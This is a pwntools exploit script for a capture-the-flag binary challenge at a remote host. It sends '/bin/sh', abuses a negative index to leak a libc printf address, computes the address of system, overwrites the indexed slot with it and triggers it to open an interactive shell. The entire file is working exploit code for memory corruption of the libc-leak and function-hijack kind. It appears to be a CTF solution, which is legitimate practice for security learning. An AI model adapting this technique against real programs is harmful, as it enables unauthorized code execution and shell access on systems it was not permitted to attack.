from pwn import *

def findOffset():
    pass

def add(index,data):
    io.sendlineafter(b'3. break armour\n',b'1')
    io.sendlineafter(b'Enter the index :',str(index).encode())
    io.sendafter(b'Enter the data :',p32(data))
    
def show(index):
    io.sendlineafter(b'3. break armour\n',b'2')
    io.sendlineafter(b'Enter the index :',str(index).encode())
    io.recvline()
    return io.recv(4).strip()

def exploit():
    io.sendlineafter(b'3. break armour\n',b'3')

if __name__ == "__main__":
    #io = process('./chall')
    io = remote('chall.eng.run',32519)
    exe = ELF('./chall')
    libc = ELF('libc-2_b28cfdbf-f139-4f97-8fd1-b1103b5e1d5d.so') 
    system_offset = libc.symbols['system']
    printf_offset = libc.symbols['printf']
    io.sendlineafter(b'ARMOUR: enabled! Try to break in ;)',b'/bin/sh')
    #pause()
    libcLeak=u32(show(-7)[0:4]) - printf_offset
    system=libcLeak+system_offset

    print(hex(system))
    add(-7,system)

    exploit()

    io.interactive()
